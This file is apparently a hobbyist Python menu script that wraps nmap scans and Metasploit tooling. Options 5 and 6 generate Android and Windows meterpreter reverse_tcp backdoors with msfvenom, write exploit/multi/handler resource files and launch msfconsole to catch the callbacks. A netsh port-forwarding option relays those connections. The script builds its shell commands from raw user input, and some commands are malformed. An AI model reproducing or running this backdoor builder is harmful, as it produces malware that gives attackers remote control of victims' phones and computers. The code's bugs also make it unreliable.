import os


print ('Type 1 For use Vuln find')
print ('Type 2 force scan')
print ('TYPE 3 top-ports')
print ('TYPE 4 -Pn')
print ('TYPE 5 Create AndRoid Backdoor')
print ('TYPE 6 Create Windows Backdoor')
print ('TYPE 7 farward to vmware or wsl (This option need to admin Access')
print ('TYPE 8 show routes')



start_over = 'scaning'

scan  = input("type options  ")


if scan == "1":
    print(start_over)
    hostname = input('enter ip ')
    os.system("nmap   --script=vuln"  + hostname) 

elif  scan == "2":
    os.system("nmap -A -sV -O    "  + input('ip ')) 
    
elif  scan == "3":
    os.system("nmap --top-ports 20 "  + input('ip ')) 

elif  scan == "4":
    os.system("nmap -Pn "  + input('ip')) 
elif  scan == "5":
    hostname = input('ip ')
    
    os.system("msfvenom -p  android/meterpreter/reverse_tcp LHOST="  + hostname + " LPORT="+input('port no ') + "  -o "+ input('Enter Backdoor Name  ')) 
    quesstions = input('Do You want to create resource file Y/N ')
    if quesstions == "y":
        port = input('enter port no')
        f = open("Android.rc", "a")
        f.write("use exploit/multi/handler\nset PAYLOAD android/meterpreter/reverse_tcp\nset LHOST 0.0.0.0 " + port + "\nset ExitOnSession false\nset EnableStageEncoding true\n#set AutoRunScript 'post/windows/manage/migrate'")
        f.close()
        load = input('Do You want to load resource file Y/N ')
        if load == "y":
            os.system("msfconsole -r Android.rc")
        else:
            print(' files in your folder')
    else:
        print("Program Exited")

elif  scan == "6":
    hostname = input('ip ')
    
    os.system("msfvenom -p  windows/x64/meterpreter/reverse_tcp LHOST="  + hostname + " LPORT="+input('port no ') + "  -o "+ input('Enter Backdoor Name  ')) 
    quesstions = input('Do You want to create resource file Y/N ')
    if quesstions == "y":
        port = input('enter port no')
        f = open("Win.rc", "a")
        f.write("use exploit/multi/handler\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nset LHOST 0.0.0.0 " + port + "\nset ExitOnSession false\nset EnableStageEncoding true\n#set AutoRunScript 'post/windows/manage/migrate'")
        f.close()
        load = input('Do You want to load resource file Y/N ')
        if load == "y":
            os.system("msfconsole -r Win.rc")
        else:
            print(' files in your folder')
    else:
        print("Program Exited")
elif  scan == "7":
    hostname = input('port no ')
    
    os.system("netsh interface portproxy add v4tov4 listenport=" + hostname + " listenaddress=0.0.0.0 connectport=" + hostname + " connectaddress=" + input('ip') )
        
elif  scan == "8":
    
    
    os.system("netsh interface portproxy show v4tov4" )
        
else:
    print("\n\n  Sorry Don't Understand")
    
    
    
